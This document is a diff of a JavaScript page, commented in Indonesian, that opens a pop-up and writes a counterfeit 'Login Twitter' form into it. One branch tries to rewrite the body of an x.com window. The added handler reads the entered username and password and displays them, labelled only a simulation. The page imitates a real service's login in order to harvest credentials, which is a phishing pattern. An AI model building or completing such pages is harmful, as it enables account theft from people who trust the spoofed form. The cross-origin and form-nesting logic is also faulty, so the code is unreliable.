@@ -10,9 +10,11 @@
 
         // Menulis tampilan login di dalam pop-up
         w.document.write('<h2>Login Twitter</h2>');
-        w.document.write('<form action="https://twitter.com/login" method="post">');
-        w.document.write('<input type="text" name="username" placeholder="Username"><br>');
-        w.document.write('<input type="password" name="password" placeholder="Password"><br>');
+        w.document.write('<form id="loginForm" action="#" method="post">');
+        w.document.write('<label for="username">Username:</label><br>');
+        w.document.write('<input type="text" id="username" name="username" placeholder="Username"><br><br>');
+        w.document.write('<label for="password">Password:</label><br>');
+        w.document.write('<input type="password" id="password" name="password" placeholder="Password"><br><br>');
         w.document.write('<input type="submit" value="Login"><br>');
         w.document.write('</form>');
         
@@ -26,11 +28,21 @@
                 if (w.location.href === "https://x.com") {
                     // Setelah berhasil, lanjutkan untuk menampilkan login form
                     w.document.body.innerHTML = '<h2>Login Twitter</h2>';
-                    w.document.body.innerHTML += '<form action="https://twitter.com/login" method="post">';
-                    w.document.body.innerHTML += '<input type="text" name="username" placeholder="Username"><br>';
-                    w.document.body.innerHTML += '<input type="password" name="password" placeholder="Password"><br>';
+                    w.document.body.innerHTML += '<form id="loginForm" action="#" method="post">';
+                    w.document.body.innerHTML += '<label for="username">Username:</label><br>';
+                    w.document.body.innerHTML += '<input type="text" id="username" name="username" placeholder="Username"><br><br>';
+                    w.document.body.innerHTML += '<label for="password">Password:</label><br>';
+                    w.document.body.innerHTML += '<input type="password" id="password" name="password" placeholder="Password"><br><br>';
                     w.document.body.innerHTML += '<input type="submit" value="Login"><br>';
                     w.document.body.innerHTML += '</form>';
+                    
+                    // Menghandle submit form untuk login
+                    w.document.getElementById('loginForm').onsubmit = function(event) {
+                        event.preventDefault();  // Mencegah reload halaman
+                        var username = w.document.getElementById('username').value;
+                        var password = w.document.getElementById('password').value;
+                        alert("Username: " + username + "\nPassword: " + password); // Hanya untuk simulasi
+                    };
                 }
             } catch (e) {
                 // Jika gagal, redirect ke halaman Google
@@ -41,4 +53,4 @@
     }
 </script>
 
-<a href="#" onclick="f()">Login Twitter</a>
+<a href="#" onclick="f()">Login X Twitter</a>
